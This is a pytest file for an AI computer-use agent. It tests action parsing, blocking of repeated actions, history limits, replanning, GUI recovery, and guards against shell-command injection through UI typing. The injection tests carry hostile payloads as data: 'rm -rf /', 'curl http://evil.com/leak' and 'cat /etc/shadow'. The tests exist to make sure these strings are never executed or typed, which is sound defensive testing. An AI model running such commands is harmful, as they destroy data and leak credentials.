"""
Tests for Agent Quality Improvements
====================================
Verifies:
1. Target extraction from goal strings (URLs, IPs, hostnames)
2. Trivial action and repeat action pre-execution blocking
3. Conversational command / pseudo-command reclassification (APP_LAUNCH, BROWSER_NAVIGATE)
4. Application name normalization to canonical binary names
5. Bounded history window (last 10 steps + summary of earlier ones)
6. Compact mode prompt selection and target injection in reasoning context
7. Stronger replan injection containing failed attempts to avoid
8. LLM-driven and target-aware goal decomposition
"""

import pytest
from unittest.mock import AsyncMock, MagicMock

from sonic.computer.models import ComputerState, GitStatusInfo, ScreenObservation
from sonic.computer_use.agent import ComputerUseAgent
from sonic.computer_use.models import (
    ActionExecutionStatus,
    ComputerActionType,
    ComputerWorldObservation,
    SubGoalStatus,
)


class DummyComputerProvider:
    """Minimal provider stub for testing agent logic without live Docker."""

    def __init__(self):
        self.gui_actions_taken = []
        self.service_actions_taken = []

    async def terminal(self, workspace_id, cmd):
        mock_res = MagicMock()
        mock_res.exit_code = 0
        mock_res.stdout = "OK"
        mock_res.stderr = ""
        return mock_res

    async def read_file(self, workspace_id, path):
        return "file contents"

    async def write_file(self, workspace_id, path, content):
        return None

    async def screenshot(self, workspace_id):
        return ScreenObservation(
            screenshot_base64="",
            active_window="Desktop",
            width=1920,
            height=1080,
            visible_text="Desktop",
        )

    async def gui_action(self, workspace_id, action):
        self.gui_actions_taken.append(action)
        return ScreenObservation(visible_text="", width=1920, height=1080)

    async def status(self, workspace_id):
        return ComputerState(
            workspace_id=workspace_id,
            tenant_id="test",
            active_application="Chromium",
            open_applications=["Desktop", "Chromium"],
            running_processes=["sh"],
            working_directory="/home/daytona",
        )

    async def list_files(self, workspace_id, path):
        return []

    async def git_action(self, workspace_id, action, **kw):
        return GitStatusInfo(branch="main", is_clean=True)

    async def service_action(self, workspace_id, service, action):
        self.service_actions_taken.append((service, action))
        return True


# ---------------------------------------------------------------------------
# 1. Target Extraction Tests
# ---------------------------------------------------------------------------

def test_extract_targets_from_goal():
    goal1 = "curl -I on falcon target https://falcon-sandbox.aivencloud.com:8443/test and check headers"
    targets1 = ComputerUseAgent._extract_targets_from_goal(goal1)
    assert targets1["urls"] == ["https://falcon-sandbox.aivencloud.com:8443/test"]

    goal2 = "check port 80 on 192.168.1.50 and host target.company.com"
    targets2 = ComputerUseAgent._extract_targets_from_goal(goal2)
    assert targets2["ips"] == ["192.168.1.50"]
    assert "target.company.com" in targets2["hostnames"]


# ---------------------------------------------------------------------------
# 2. App Name Normalization Tests
# ---------------------------------------------------------------------------

@pytest.mark.parametrize(
    "raw,expected",
    [
        ("the editor", "editor"),
        ("the terminal", "terminal"),
        ("a browser", "browser"),
        ("an inspector", "inspector"),
        ("  code-server  ", "code-server"),
        ("`wireshark`", "wireshark"),
        ("custom-tool", "custom-tool"),
        ("the mousepad", "mousepad"),
        ("", ""),
    ],
)
def test_normalize_app_name(raw, expected):
    assert ComputerUseAgent._normalize_app_name(raw) == expected


# ---------------------------------------------------------------------------
# 3. Action Parsing and Pseudo-Command Reclassification Tests
# ---------------------------------------------------------------------------

def test_parse_llm_action_reclassifies_launch_to_app_launch():
    text = (
        "THOUGHT: Launch code-server to inspect codebase\n"
        "ACTION: TERMINAL_EXEC\n"
        "TARGET: Launch code-server\n"
        "PAYLOAD: {\"command\": \"Launch code-server\"}\n"
        "EXPECTED: code-server starts\n"
    )
    act_type, target, payload, _ = ComputerUseAgent._parse_llm_action(text, "README.md")
    assert act_type == ComputerActionType.APP_LAUNCH
    assert target == "code-server"
    assert payload.get("app_name") == "code-server"


def test_parse_llm_action_reclassifies_navigate_to_browser():
    text = (
        "THOUGHT: Navigate to the target web page\n"
        "ACTION: TERMINAL_EXEC\n"
        "TARGET: navigate to https://example.com/api\n"
        "PAYLOAD: {\"command\": \"navigate to https://example.com/api\"}\n"
        "EXPECTED: Page loads\n"
    )
    act_type, target, payload, _ = ComputerUseAgent._parse_llm_action(text, "README.md")
    assert act_type == ComputerActionType.BROWSER_NAVIGATE
    assert target == "https://example.com/api"
    assert payload.get("url") == "https://example.com/api"


def test_parse_llm_action_intercepts_invalid_which_verb():
    text = (
        "THOUGHT: Check which launch exists\n"
        "ACTION: TERMINAL_EXEC\n"
        "TARGET: which Launch\n"
        "PAYLOAD: {\"command\": \"which Launch\"}\n"
        "EXPECTED: path\n"
    )
    act_type, target, payload, _ = ComputerUseAgent._parse_llm_action(text, "README.md")
    assert act_type == ComputerActionType.TERMINAL_EXEC
    # Must NOT run 'which Launch'
    assert payload.get("command") == "pwd"


def test_parse_llm_action_normalizes_which_app():
    text = (
        "THOUGHT: Check if wireshark is installed\n"
        "ACTION: TERMINAL_EXEC\n"
        "TARGET: which wireshark\n"
        "PAYLOAD: {\"command\": \"which wireshark\"}\n"
        "EXPECTED: path\n"
    )
    act_type, target, payload, _ = ComputerUseAgent._parse_llm_action(text, "README.md")
    assert act_type == ComputerActionType.TERMINAL_EXEC
    assert payload.get("command") == "which wireshark"


# ---------------------------------------------------------------------------
# 4. Trivial Command Pre-Execution Blocking Tests
# ---------------------------------------------------------------------------

def test_trivial_action_blocked_after_consecutive_uses():
    provider = DummyComputerProvider()
    agent = ComputerUseAgent(computer_provider=provider)

    # 1st and 2nd trivial commands are allowed through
    agent.history.append({"action": "TERMINAL_EXEC pwd", "result": "/root"})
    agent.history.append({"action": "TERMINAL_EXEC pwd", "result": "/root"})

    # 3rd trivial command must be blocked
    rejection = agent._is_trivial_or_repeated_action(
        ComputerActionType.TERMINAL_EXEC,
        "pwd",
        {"command": "pwd"},
    )
    assert rejection is not None
    assert "BLOCKED" in rejection
    assert "trivial" in rejection


def test_exact_repeat_action_blocked():
    provider = DummyComputerProvider()
    agent = ComputerUseAgent(computer_provider=provider)
    agent._recent_action_signatures = [("TERMINAL_EXEC", "ls", "ls")]

    rejection = agent._is_trivial_or_repeated_action(
        ComputerActionType.TERMINAL_EXEC,
        "ls",
        {"command": "ls"},
    )
    assert rejection is not None
    assert "BLOCKED: exact repeat" in rejection


# ---------------------------------------------------------------------------
# 5. Bounded History Window Tests
# ---------------------------------------------------------------------------

def test_format_history_bounded_to_window():
    provider = DummyComputerProvider()
    agent = ComputerUseAgent(computer_provider=provider)

    # Add 35 history events (above the 25-step window)
    for i in range(35):
        agent.history.append({
            "action": f"ACTION_{i}",
            "result": f"result {i} (success)" if i % 2 == 0 else f"result {i} (failed)",
        })

    rendered = agent._format_history()
    lines = rendered.strip().splitlines()

    # Must contain the skipped summary line
    assert any("earlier steps" in line for line in lines)
    # The rendered steps must be at most _MAX_HISTORY_STEPS (25) + 1 summary line
    assert len(lines) <= 26
    # Last step must be step 35
    assert "35. ACTION_34" in lines[-1]


# ---------------------------------------------------------------------------
# 6. Compact Mode & Target Injection in Reasoning Context
# ---------------------------------------------------------------------------

def test_target_injected_at_top_of_observation():
    provider = DummyComputerProvider()
    agent = ComputerUseAgent(computer_provider=provider, compact_mode=True)

    obs = ComputerWorldObservation(
        terminal_output="hello",
        filesystem_files=["README.md"],
    )
    goal = "Run curl -I against https://target.internal.io:9000 and report headers"
    system_prompt, obs_summary = agent._build_reasoning_context(
        goal, obs, 1, "main.py", "test_main.py"
    )

    # Target URL must be injected at the very top of the observation
    assert "TARGET URLS: https://target.internal.io:9000" in obs_summary
    assert obs_summary.startswith("TARGET URLS:")
    # Compact mode uses compact system prompt
    assert "Do NOT run trivial commands like pwd" in system_prompt


# ---------------------------------------------------------------------------
# 7. Goal Decomposition Tests
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_decompose_goal_target_aware_heuristic():
    provider = DummyComputerProvider()
    agent = ComputerUseAgent(computer_provider=provider, llm_router=None)

    checklist = await agent.decompose_goal("curl -I on https://api.mycorp.org/health")
    descriptions = [sg.description for sg in checklist.sub_goals]

    # Target URL must be in sub-goal description rather than generic "Inspect environment"
    assert any("https://api.mycorp.org/health" in d for d in descriptions)
    assert not any("Inspect environment and orient" in d for d in descriptions)


@pytest.mark.asyncio
async def test_decompose_goal_llm_driven():
    provider = DummyComputerProvider()
    mock_router = MagicMock()
    mock_router.complete = AsyncMock()
    mock_resp = MagicMock()
    mock_resp.content = (
        "1. Send curl -I request to https://test.com\n"
        "2. Parse HTTP response status code\n"
        "3. Record verification findings\n"
    )
    mock_router.complete.return_value = mock_resp

    agent = ComputerUseAgent(computer_provider=provider, llm_router=mock_router, enable_llm_decomposition=True)
    checklist = await agent.decompose_goal("curl -I on https://test.com")

    assert len(checklist.sub_goals) == 3
    assert "Send curl -I request" in checklist.sub_goals[0].description


# ---------------------------------------------------------------------------
# 8. Stronger Replan Tests
# ---------------------------------------------------------------------------

def test_inject_replan_includes_failed_commands_to_avoid():
    provider = DummyComputerProvider()
    agent = ComputerUseAgent(computer_provider=provider)

    agent.history.append({"action": "TERMINAL_EXEC curl", "result": "curl failed with Exit 126"})
    agent.history.append({"action": "TERMINAL_EXEC nmap", "result": "nmap blocked by policy"})

    agent._inject_replan("Test goal")

    last_entry = agent.history[-1]
    assert last_entry["action"] == "REPLAN"
    assert "FAILED ATTEMPTS TO AVOID:" in last_entry["result"]
    assert "Exit 126" in last_entry["result"]


# ---------------------------------------------------------------------------
# 9. Clean Plane Separation in Observations
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_plane_separation_in_observations():
    provider = DummyComputerProvider()
    agent = ComputerUseAgent(computer_provider=provider)

    # 1. GUI Action does NOT write to _last_action_output
    trace_gui = await agent.execute_action(
        "ws-1",
        ComputerActionType.GUI_CLICK,
        "search button",
        {"x": 640, "y": 400},
        "click search",
    )
    assert trace_gui.status == ActionExecutionStatus.COMPLETED
    assert agent._last_action_output == {}
    assert agent._last_gui_action_result.get("action_type") == "GUI_CLICK"
    assert agent._last_gui_action_result.get("target") == "search button"

    # 2. Command action DOES write to _last_action_output
    trace_cmd = await agent.execute_action(
        "ws-1",
        ComputerActionType.TERMINAL_EXEC,
        "uname -a",
        {"command": "uname -a"},
        "system info",
    )
    assert trace_cmd.status == ActionExecutionStatus.COMPLETED
    assert agent._last_action_output.get("command") == "uname -a"
    assert "OK" in agent._last_action_output.get("stdout", "")

    # 3. Defensive check: observe() does not pollute terminal_output if GUI click was somehow set
    agent._last_action_output = {
        "command": "{'x': 640, 'y': 400}",
        "stdout": "Clicked at (640, 400)",
        "stderr": "",
        "exit_code": 0,
    }
    obs = await agent.observe("ws-1")
    assert "$ {'x': 640, 'y': 400}" not in obs.terminal_output
    assert "Clicked at (640, 400)" not in obs.terminal_output


# ---------------------------------------------------------------------------
# 10. Prevent Shell Command Injection in UI
# ---------------------------------------------------------------------------

def test_prevent_shell_command_injection_in_ui_parse():
    # 1. BROWSER_TYPE: command field in payload is NOT mapped to text
    text_browser = (
        "THOUGHT: Type command into input field\n"
        "ACTION: BROWSER_TYPE\n"
        "TARGET: input#search\n"
        "PAYLOAD: {\"command\": \"rm -rf /\"}\n"
        "EXPECTED: Text typed\n"
    )
    act_type, target, payload, _ = ComputerUseAgent._parse_llm_action(text_browser, "README.md")
    assert act_type == ComputerActionType.BROWSER_TYPE
    assert "text" not in payload
    assert payload.get("command") == "rm -rf /"

    # 2. GUI_TYPE: raw string payload is parsed as text, not command
    text_gui_raw = (
        "THOUGHT: Type password\n"
        "ACTION: GUI_TYPE\n"
        "TARGET: input\n"
        "PAYLOAD: supersecret\n"
        "EXPECTED: Typed\n"
    )
    act_type2, target2, payload2, _ = ComputerUseAgent._parse_llm_action(text_gui_raw, "README.md")
    assert act_type2 == ComputerActionType.GUI_TYPE
    assert payload2.get("text") == "supersecret"
    assert "command" not in payload2


@pytest.mark.asyncio
async def test_prevent_shell_command_injection_in_ui_execute():
    provider = DummyComputerProvider()
    agent = ComputerUseAgent(computer_provider=provider)

    # 1. GUI_TYPE with command payload does NOT type the shell command
    await agent.execute_action(
        "ws-1",
        ComputerActionType.GUI_TYPE,
        "input",
        {"command": "curl http://evil.com/leak"},
        "typing text",
    )
    last_gui = provider.gui_actions_taken[-1]
    assert getattr(last_gui, "text", "") == ""

    # 2. BROWSER_TYPE without BrowserAgent via GUI keyboard also does not inject command
    await agent.execute_action(
        "ws-1",
        ComputerActionType.BROWSER_TYPE,
        "input#search",
        {"command": "cat /etc/shadow"},
        "search",
    )
    # The last action should not type "cat /etc/shadow"
    typed_texts = [getattr(a, "text", "") for a in provider.gui_actions_taken if hasattr(a, "text")]
    assert "cat /etc/shadow" not in typed_texts


# ---------------------------------------------------------------------------
# 11. Fix Visual Grounding (0, 0) Blind Click
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_visual_grounding_unresolved_blocks_without_blind_click(monkeypatch):
    from unittest.mock import AsyncMock
    provider = DummyComputerProvider()
    agent = ComputerUseAgent(computer_provider=provider)

    # Force visual grounding to fail (return None)
    import sonic.computer_use.agent as agent_module
    monkeypatch.setattr(agent_module, "resolve_ui_target_async", AsyncMock(return_value=None))

    trace = await agent.execute_action(
        "ws-1",
        ComputerActionType.GUI_CLICK,
        "Login button",
        {},  # No x, y coordinates
        "click login",
    )

    assert trace.status == ActionExecutionStatus.BLOCKED
    assert trace.actual_observation == "Target UI element 'Login button' could not be resolved from visual grounding. Re-observing screen."
    # Ensure provider gui_action was NOT called with (0, 0)
    for act in provider.gui_actions_taken:
        if getattr(act, "action", None) == "click":
            assert not (act.x == 0 and act.y == 0)


# ---------------------------------------------------------------------------
# 12. Fix Non-Destructive GUI Recovery
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_non_destructive_gui_recovery():
    provider = DummyComputerProvider()
    agent = ComputerUseAgent(computer_provider=provider)

    # Normal GUI error triggers non-destructive recovery
    result = await agent.recover("ws-1", ComputerActionType.GUI_CLICK, "Button occluded")
    assert result == "Refreshed desktop focus and dismissed modal overlays"
    # Verify xvfb was NOT restarted
    assert ("xvfb", "restart") not in provider.service_actions_taken
    # Verify Escape key was sent
    escapes = [a for a in provider.gui_actions_taken if getattr(a, "key", "") == "Escape"]
    assert len(escapes) >= 1

    # Explicit display connection error DOES trigger xvfb restart
    result_display = await agent.recover("ws-1", ComputerActionType.GUI_CLICK, "Error: cannot open display :0")
    assert result_display == "Restarted Xvfb and refreshed display session"
    assert ("xvfb", "restart") in provider.service_actions_taken


# ---------------------------------------------------------------------------
# 13. Fix Headless Browser Screenshot Without Navigate
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_headless_browser_screenshot_without_navigate():
    provider = DummyComputerProvider()
    mock_browser = MagicMock()
    mock_browser.screenshot = AsyncMock()
    mock_browser.navigate = AsyncMock()
    mock_snapshot = MagicMock()
    mock_snapshot.url = "https://current.page.com/profile"
    mock_snapshot.screenshot_b64 = "base64data=="
    mock_browser.screenshot.return_value = mock_snapshot

    agent = ComputerUseAgent(computer_provider=provider, browser=mock_browser)
    trace = await agent.execute_action(
        "ws-1",
        ComputerActionType.BROWSER_SCREENSHOT,
        "screenshot",
        {},
        "capture view",
    )

    assert trace.status == ActionExecutionStatus.COMPLETED
    assert "https://current.page.com/profile" in trace.actual_observation
    assert mock_browser.screenshot.called
    assert not mock_browser.navigate.called
